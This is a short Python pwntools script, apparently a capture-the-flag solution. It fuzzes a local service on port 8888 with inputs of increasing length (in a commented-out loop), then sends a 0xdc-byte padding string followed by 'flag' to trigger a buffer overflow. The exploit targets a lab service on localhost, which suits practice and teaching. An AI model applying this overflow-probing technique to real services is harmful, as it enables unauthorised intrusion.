from pwn import *

#context.log_level = 'debug'

'''
for i in range(1, 1024):
    io = remote('127.0.0.1', 8888)
    io.sendline('f'*i)
    try:
        data = io.recvline()
        if 'not enough' not in data:
            print hex(i)
            print data
            print io.recvall()
            raw_input('continue?')
    except:
        print hex(i)
        raw_input('error?')
    io.close()
'''


io = remote('127.0.0.1', 8888)
io.sendline('a'*0xdc+'flag')
print io.recvall()
io.close()


